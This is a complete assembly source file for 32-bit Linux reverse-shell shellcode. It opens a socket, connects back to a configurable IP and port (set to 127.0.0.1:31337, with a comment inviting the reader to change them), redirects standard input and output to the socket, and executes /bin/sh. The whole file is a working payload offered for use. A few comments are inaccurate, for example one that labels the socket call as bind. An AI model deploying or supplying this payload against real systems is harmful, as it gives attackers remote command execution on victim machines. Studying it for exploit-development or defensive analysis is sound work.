[BITS 32]

; You might want to change these
%define MY_IP			2130706433		; 127.0.0.1 in decimal in network order
%define PORT			0x697a			; 31337


; Some constants
%define SYS_SOCKET      1
%define SYS_BIND        2
%define SYS_CONNECT     3
%define SYS_LISTEN      4
%define SYS_ACCEPT      5
%define SYS_SEND        9
%define SYS_RECV        10
%define SYS_SOCKETCALL  0x66
%define SYS_DUP2		0x3f
%define SYS_EXECVE		0x0b

%define SOCK_STREAM		1
%define AF_INET			2
%define PF_INET			AF_INET


	xor edx, edx						; EDX will be 0x00 for most of this code

	; fd = socket(int domain, int type, int protocol
	;		socket(AF_INET, SOCK_STREAM, 0)
	push BYTE SYS_SOCKETCALL
	pop eax								; EAX = SYS_SOCKETCALL
	push BYTE SYS_SOCKET
	pop ebx								; EBX = SYS_BIND
	push edx							; argv: {	protocol = 0x00,
	push BYTE SOCK_STREAM				;			type = SOCK_STREAM,
	PUSH BYTE AF_INET					;			domain = AF_INET }
	mov ecx, esp						; ECX = ESP
	int 0x80

	mov esi, eax						; ESI = socket fd


	; connect(int sockfd, sockaadr* addr, socklen addrlen)
	;		connect(esi, [2, 31337, <IP>], 16)
	push BYTE SYS_SOCKETCALL
	pop eax
	push BYTE SYS_CONNECT
	pop ebx

	; Push sockaddr to stack
	push DWORD MY_IP
	push WORD PORT
	push WORD AF_INET
	mov ecx, esp					; ECX = addr

	push BYTE 0x10					; argv {	addrlen = 16
	push ecx						;			addr*
	push esi						;			sock_fd = esi}

	mov ecx, esp
	int 0x80


	; dup2(int oldfd, int newfd)
	;		dup2(STDIN, socketfd)
	;		dup2(STDOUT, socketfd)
	;		dup2(STDERR, socketfd)
	mov ebx, esi					; ebx = sockfd
	push BYTE 0x02
	pop ecx							; ecx = 2, (loop variable)
dup2_loop:
	push BYTE SYS_DUP2
	pop eax							; eax = SYS_DUP2
	int 0x80						; call dup2
	dec ecx							; ecx--, raises Sign Flag (SF) if negative
	jns dup2_loop					; Jumps on Sign Flag


	; execve(char* filename, char* argv[], char* envp[])
	;		execve("//bin/sh", ["//bin/sh", 0], 0)
	push edx
	push "n/sh"
	push "//bi"
	mov ebx, esp
	push edx
	mov edx, esp
	push ebx
	mov ecx, esp

	push BYTE SYS_EXECVE
	pop eax
	int 0x80
